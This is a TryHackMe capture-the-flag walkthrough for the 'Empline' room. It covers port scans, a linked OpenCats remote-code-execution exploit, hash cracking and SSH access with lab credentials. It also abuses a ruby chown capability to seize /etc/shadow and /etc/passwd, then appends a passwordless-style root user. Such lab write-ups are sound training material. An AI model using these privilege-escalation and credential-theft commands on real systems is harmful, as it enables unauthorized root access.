# Empline

**Room Link:** [https://tryhackme.com/room/empline](https://tryhackme.com/room/empline)

### **Scans** <a href="#scans" id="scans"></a>

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## **TCP/80 - HTTP**

**Kali**

```
gobuster dir --url http://$VICTIM/ -w /usr/share/dirb/wordlists/big.txt -l
```

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>



**Kali**

```
echo "$VICTIM job.empline.thm" >> /etc/hosts
```

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>



## Initial Shell

OpenCats 0.9.4 has a RCE exploit.

Exploit: [https://www.exploit-db.com/raw/50585](https://www.exploit-db.com/raw/50585)

**Kali**

```
chmod +x exploit.sh 
./exploit.sh 
./exploit.sh http://job.empline.thm/
```

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
getcap -r / 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
ls -lah /etc/shadow
ruby -e 'require "fileutils"; FileUtils.chown("www-data", "www-data", "/etc/shadow")'
ls -lah /etc/shadow
```

<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

**Victim**

Now that we can read both f these files we can transfer them to Kali. I let this run for a while but it wasn't cracking any hashes.

```
cat /etc/passwd
cat /etc/shadow
```

**Kali**

```
unshadow passwd shadow > passwords.txt
```

**Kali**

```
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

I went back to the check the box and found the database credentials&#x20;

**Victim**

```
find / -name "config.php"
cat /var/www/opencats/config.php 
```

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
mysql -h $VICTIM -u james -png6pUFvsGNtw  
```

**Kali(mysql)**

```
show databases;
use opencats
show tables;  
select * from user;  
```



There were a few hashes from users so I put them in crackstation and one returned a result.

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

## **TCP/22 - SSH**

**Kali**

```
ssh george@$VICTIM
Password: pretonnevippasempre
```



## Privilege Escalation

Since I had access to change any file already I just added a new root user to passwd

**Victim**

```
ruby -e 'require "fileutils"; FileUtils.chown("george", "george", "/etc/passwd")'
echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
su new
Password: 123
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
